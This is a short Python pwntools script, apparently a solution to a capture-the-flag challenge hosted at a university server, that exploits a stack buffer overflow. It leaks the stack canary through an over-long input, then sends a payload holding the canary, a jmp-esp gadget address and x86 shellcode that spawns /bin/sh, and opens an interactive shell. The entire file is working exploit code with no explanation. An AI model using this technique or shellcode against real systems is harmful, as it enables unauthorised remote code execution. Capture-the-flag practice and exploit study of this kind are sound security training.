#!/usr/bin/env python

from pwn import *

# r = process('./foo_3')
r = remote('bamboofox.cs.nctu.edu.tw', 10103)

shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
jmp_esp = 0x080486d0
ret = 0x080483b2

r.sendline('a' * 12)
r.recvuntil(': ')

canary = u32('\x00' + r.recv()[13:-1])
log.info(hex(canary))

r.sendline('a' * 12 + p32(canary) + 'a' * 12 + p32(jmp_esp) + shellcode)

r.interactive()
